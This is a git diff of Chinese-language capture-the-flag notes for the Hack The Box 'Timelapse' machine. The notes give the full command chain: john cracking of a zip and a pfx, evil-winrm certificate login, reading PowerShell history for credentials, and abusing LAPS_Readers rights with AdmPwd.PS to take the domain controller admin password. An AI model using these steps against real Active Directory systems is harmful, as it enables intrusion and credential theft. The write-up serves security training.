@@ -1,5 +1,60 @@
 ## Timelapse
+### 总结
+#### LAPS_Readers：有权限读取 LAPS 管理的本地管理员密码；
+#### LAPS 的 PowerShell 模块：AdmPwd.PS，专门从 Active Directory 中读取 LAPS 存储的本地管理员密码
+#### OU=Domain Controllers //组织单位（OU）
+####   └── DC01$
+#### LAPS 的密码存在 AD 里这个属性：ms-Mcs-AdmPwd，谁能读这个属性，由：ExtendedRightHolders，通过这个模块：AdmPwd.PS里面的命令：Find-AdmPwdExtendedRights
+#### Find-AdmPwdExtendedRights= 查看谁能读取某台计算机 / OU 的 LAPS 管理员密码
+#### 读取 PowerShell 历史记录文件的完整路径是什么？（从哪个路径开始$env:？）$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+[★]$ zip2john winrm_backup.zip > zip.john
+[★]$ john zip.john -wordlist:rockyou.txt
+[★]$ unzip winrm_backup.zip
+[★]$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out ket.pem -nodes //不行
 
+利用pfx2john实用程序将pfx文件转换为散列格式
+[★]$ python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.john
+[★]$ john pfx.john -wordlist:rockyou.txt
+
+[★]$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
+[★]$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem 
+
+【1】
+[★]$ evil-winrm -i 10.129.227.113 -c cert.pem -k key.pem -S
+*Evil-WinRM* PS C:\Users\legacyy\Documents> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+【2】
+[★]$ evil-winrm -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy //*LAPS_Readers
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *LAPS_Readers         *Domain Users
+
+【3】
+LAPS_Readers组的一部分的LAPS （Local Administrator Password Solution）用于管理本地帐户的密码活动目录计算机。有一个PowerShell模块可以用来检索它密码可以在github上找到，名为AdmPwd.PS
+[★]$ git clone https://github.com/ztrhgf/LAPS.git
+[~/LAPS][★]$ evil-winrm -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S                                       *Evil-WinRM* PS C:\Users\svc_deploy\Documents> upload AdmPwd.PS
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Import-Module .\AdmPwd.PS\AdmPwd.PS.psd1
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Find-AdmPwdExtendedRights -Identity * //检查谁能读 LAPS 密码
+
+Name                 DistinguishedName                                                 Status
+----                 -----------------                                                 ------
+Domain Controllers   OU=Domain Controllers,DC=timelapse,DC=htb                         Delegated
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Find-AdmPwdExtendedRights -identity 'Domain Controllers' | select-object ExtendedRightHolders //只显示“谁有权限”的那一列
+
+ExtendedRightHolders
+--------------------
+{NT AUTHORITY\SYSTEM, TIMELAPSE\Domain Admins, TIMELAPSE\LAPS_Readers}
+
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> get-admpwdpassword -computername dc01 | Select password
+
+Password
+--------
+GZN/HA(;IeJlZH8B$m}kq/Js
+【4】
+[★]$ evil-winrm -i 10.129.227.113 -u administrator -p 'GZN/HA(;IeJlZH8B$m}kq/Js' -S
+[★]$ evil-winrm -i 10.129.227.113 -u administrator -p 'GZN/HA(;IeJlZH8B$m}kq/Js' -S -s AdmPwd.PS/
+*Evil-WinRM* PS C:\Users\Administrator> Get-ChildItem -Path C:\ -Filter root.txt -Recurse -ErrorAction SilentlyContinue
+```
 #### Get-ChildItem -Path C:\ -Filter root.txt -Recurse -ErrorAction SilentlyContinue
 ```
 [★]$ nmap -sV -sC 10.129.227.113
@@ -13,7 +68,7 @@ PORT     STATE SERVICE           VERSION
 135/tcp  open  msrpc             Microsoft Windows RPC
 139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
 389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
-445/tcp  open  microsoft-ds?
+445/tcp  open  microsoft-ds? //MSB协议
 464/tcp  open  kpasswd5?
 593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
 636/tcp  open  ldapssl?
@@ -227,7 +282,7 @@ d-----         2/2/2026   9:16 AM                en-US
 *Evil-WinRM* PS C:\Users\svc_deploy\Documents> Import-Module .\AdmPwd.PS\AdmPwd.PS.psd1
 
 //上传模块后，我们可以检查哪些对象可以使用下面的命令。
-*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Find-AdmPwdExtendedRights -Identity *
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Find-AdmPwdExtendedRights -Identity * //组织单位（OU）
 
 Name                 DistinguishedName                                                 Status
 ----                 -----------------                                                 ------
@@ -258,7 +313,7 @@ ExtendedRightHolders
 {NT AUTHORITY\SYSTEM, TIMELAPSE\Domain Admins, TIMELAPSE\LAPS_Readers}
 
 ```
-#### 前一个命令的输出表明LAPS Readers组具有委托权限域控制器，它允许我们读取此对象中用户的密码。我们检索使用如下命令设置密码。
+#### 前一个命令的输出表明LAPS_Readers组具有委托权限域控制器，它允许我们读取此对象中用户的密码。我们检索使用如下命令设置密码。
 ```
 *Evil-WinRM* PS C:\Users\svc_deploy\Documents> get-admpwdpassword -computername dc01 | Select password
 
